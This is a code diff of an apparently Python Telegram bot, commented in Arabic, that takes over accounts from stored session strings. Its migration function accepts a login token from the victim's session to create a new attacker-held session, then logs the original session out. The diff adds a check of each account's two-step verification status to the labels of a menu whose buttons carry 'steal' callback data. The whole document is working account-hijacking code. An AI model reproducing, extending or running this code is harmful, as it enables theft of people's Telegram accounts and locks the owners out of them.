@@ -304,6 +304,7 @@ def get_all_accounts(owner_id):
     rows = c.fetchall()
     conn.close()
     return rows
+
 def get_account(acc_id):
     conn = get_db_conn()
     c = conn.cursor()
@@ -536,12 +537,9 @@ def handle_hex_login(message):
 
     run_async(process_hex())
 
-
-
-
-
-
-
+# =========================================================
+# 👑 السحب الشامل والمطور (نظام التهجير والمراقبة)
+# =========================================================
 
 async def execute_full_migration(acc_id, client_a, original_owner, admin_id, phone, name):
     """محرك السحب الخام والتهجير الجذري إلى Session B وتسجيل الخروج من A (الترتيب الجديد والقراءة من القاعدة)"""
@@ -603,7 +601,7 @@ async def execute_full_migration(acc_id, client_a, original_owner, admin_id, pho
             in_memory=True,
             device_model=B_DEVICE_MODEL
         ) 
-        
+
         await client_b.storage.open()
         await client_b.storage.dc_id(target_dc) 
         await client_b.storage.test_mode(False)
@@ -618,7 +616,7 @@ async def execute_full_migration(acc_id, client_a, original_owner, admin_id, pho
 
             # ننشئ الجلسة مرة أخرى على السيرفر المطلوب
             client_b = Client(f"cb_retry_{acc_id}", api_id=API_ID, api_hash=API_HASH, in_memory=True, device_model=B_DEVICE_MODEL)
-            
+
             await client_b.storage.open()
             await client_b.storage.dc_id(int(qr.dc_id))
             await client_b.storage.test_mode(False)
@@ -629,7 +627,7 @@ async def execute_full_migration(acc_id, client_a, original_owner, admin_id, pho
 
         # 6. الجلسة A توافق على الرمز وتمرر الصلاحيات
         if isinstance(qr, types.auth.LoginToken):
-            
+
             # نأخذ ناتج القبول
             try:
                 res_a = await client_a.invoke(functions.auth.AcceptLoginToken(token=qr.token))
@@ -647,7 +645,7 @@ async def execute_full_migration(acc_id, client_a, original_owner, admin_id, pho
                         break
                 except Exception:
                     pass
-            
+
             if not success_obj:
                 raise Exception("وافقت الجلسة A على الرمز، ولكن B لم يستلم إشارة التفعيل (LoginTokenSuccess).")
 
@@ -668,7 +666,7 @@ async def execute_full_migration(acc_id, client_a, original_owner, admin_id, pho
                 me_b = await client_b.get_me()
             except Exception as e:
                 raise Exception(f"فشل التحقق من B بعد استلام النجاح: {str(e)}")
-            
+
             if not me_b:
                 raise Exception("فشل الحصول على بيانات الحساب للجلسة الجديدة.")
 
@@ -741,14 +739,6 @@ async def execute_full_migration(acc_id, client_a, original_owner, admin_id, pho
         if verify_b and verify_b.is_connected: await verify_b.disconnect()
         if client_a.is_connected: await client_a.disconnect()
         return False
-
-
-
-
-
-
-
-
 
 # =========================================================
 # 🎛️ واجهات التحكم
@@ -1251,10 +1241,6 @@ def handle_files(message):
         finally:
             shutil.rmtree(extract_dir, ignore_errors=True)
 
-# =========================================================
-# 👑 السحب الشامل والمطور (نظام التهجير والمراقبة)
-# =========================================================
-
 @bot.callback_query_handler(func=lambda call: call.data == "admin_add_user")
 def admin_add_user_start(call):
     if call.from_user.id not in ADMIN_IDS: return
@@ -1300,8 +1286,20 @@ async def check_account_for_menu(acc):
     client = Client(f"tmp_{acc_id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_sess, in_memory=True)
     color = ""
     session_count = "?"
+    two_fa_status = "غير معروف"
     try:
         await asyncio.wait_for(client.connect(), timeout=5)
+        
+        # فحص وجود تحقق بخطوتين
+        try:
+            pwd = await client.invoke(functions.account.GetPassword())
+            if getattr(pwd, 'has_password', False):
+                two_fa_status = "مفعل❌"
+            else:
+                two_fa_status = "غير مفعل ✅"
+        except Exception:
+            pass
+
         auths = await client.invoke(functions.account.GetAuthorizations())
         session_count = len(auths.authorizations)
         current = next((a for a in auths.authorizations if getattr(a, 'current', False)), None)
@@ -1325,7 +1323,7 @@ async def check_account_for_menu(acc):
 
     creation_year = get_creation_year(uid)
     country_name, country_flag = get_country_info(phone)
-    btn_text = f"{color} {name} | {country_flag} {country_name} | {creation_year} | جلسات:{session_count}"
+    btn_text = f"{color} {name} | {creation_year} | {two_fa_status} | {country_flag} {country_name} | جلسات:{session_count}"
     return InlineKeyboardButton(btn_text, callback_data=f"steal:{acc_id}")
 
 async def build_steal_menu_async(admin_id, chat_id, msg_id):
